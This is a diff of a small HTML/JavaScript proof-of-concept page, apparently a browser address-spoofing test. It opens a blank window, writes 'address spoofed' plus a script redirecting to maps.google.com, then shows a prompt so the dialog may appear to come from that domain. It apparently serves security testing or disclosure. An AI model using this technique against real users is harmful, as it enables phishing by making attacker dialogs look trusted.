@@ -1,27 +1,26 @@
+<h1>test purpose</h1>
+<br>
+
 <button style="font-size: 50px;" onclick="spoof()">Click</button>
 
 <script>
-async function spoof() {
+function spoof() {
     const w = window.open("about:blank");
 
-    if (!w) return;
-
     w.document.write(`
-        <h1>Navigation + Share Test</h1>
+        <h1>address spoofed</h1>
+
+        <script>
+            setTimeout(() => {
+                location.href = "https://maps.google.com/";
+            }, 1);
+        <\/script>
     `);
 
-    try {
-        const sharePromise = navigator.share({
-            title: "Navigation Test",
-            text: "Testing concurrent browser operations",
-            url: "https://example.com"
-        });
+    w.document.close();
 
-        w.location.href = "https://example.com";
-
-        await sharePromise;
-    } catch (err) {
-        console.log("Share:", err.name, err.message);
-    }
+    setTimeout(() => {
+        prompt("Halooo")
+    }, 200);
 }
 </script>
